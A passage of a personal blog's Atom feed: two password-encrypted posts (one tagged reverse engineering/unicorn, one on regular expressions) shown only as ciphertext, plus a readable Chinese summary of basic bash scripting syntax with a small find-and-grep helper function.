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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-04-19T11:32:58.508Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/正则表达式/正则表达式/</id>
    <published>2018-04-08T08:32:33.000Z</published>
    <updated>2019-04-19T11:31:33.949Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX19mCSwPaweE1xCcC38ngqubQ+90sT5SPMYWtV3rMYKo3salvU1Qeui7sObAkiy2TScmvvrieVLTZoQVKgEFpDKQqEtjsLAr5VIX5ZWWVJ/sYVZa7mI3Ny3ABy/svYp0aXqtd3AK2dNQiEpLm+nJF12NC9MwohAhZr5GyZ/fDos8QczTvlr84e+kpAM3WDjWVE8oToKfqC+Yl/KCOo8EzHT/Mo6SxSzEHfcxovBY5JEMGwc9uLT9W19JvkOAkZcdLT/5KJqB7EmIhAFAUeIuLA4pmJ/OHOvbbdgDPNdu+314pzfIJt/ScsyUXWSXQqrCMroRXR4taAprnbmLbl52ymgXmRJSiUm1cnCcc4jY4r8Nx+Ddb/lIG7OF59ny5XIyuiDbx8tHix9VPjnFpFof4/NhKz4q/pGfYdb6aeU0psqfKSQvMQ+FlHRC+leWH58/tB2zGot2Xm/zITYOQB9mjAceGJpN+G3Zx7ffD7q7VAIjcniKCpRwljPMzKmCyyQh71ImDeVgTYT0i1OBqup+FMMA9qYR+ACdy6UgSqUecZeD3EbNgJ+wrx7fg2atG2i7VvRBN4lMXbpuiLmvtp/XV/aZnXOgOQfwyQOn1MBv2omDAtNG4OlE5wsAErd0CfV+Hrb9XHe4xciHoPHXQr7rKSuWVP6+GK6O7SXDY57BUc9ENrBhsSq/gYqRqDpvlEtR6TGbNP0feFFNbbPeuf1zCGKR3NqI4YH48YTX+o+cC98+CEMxuFCGjGPk3YgwYA82ThrjYARyL7uycsTuEuuiLWQKC7Maqta2pPwNaeVf3RrUYLLZkHg50iv2zSFLJ1Oz4u6fCZ412eledT22XWA3b